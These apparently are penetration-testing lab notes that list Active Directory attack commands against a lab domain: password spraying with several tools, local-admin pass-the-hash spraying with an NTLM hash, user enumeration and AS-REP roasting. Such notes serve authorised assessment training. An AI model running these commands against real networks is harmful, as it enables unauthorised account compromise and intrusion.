# Internal Password Spraying from a Linux Host
## rpcclient
```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
## Kerbrute 
```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```
## Using CrackMapExec & Filtering Logon Failures
```
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```
### Validating the Credentials with CrackMapExec
```
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```
## Local Administrator Password Reuse
### Local Admin Spraying with CrackMapExec
```
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
## Internal Password Spraying - from Windows
```
Import-Module .\DomainPasswordSpray.ps1
```
```
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
We find a valid password for two more users, but neither has interesting access. It's still worth noting down a finding for Weak Active Directory Passwords allowed and moving on.
## ASREPRoasting
### Linux
#### Retrieving the AS-REP Using Kerbrute
```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```
#### Hunting for Users with Kerberoast Pre-auth Not Required
```
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
```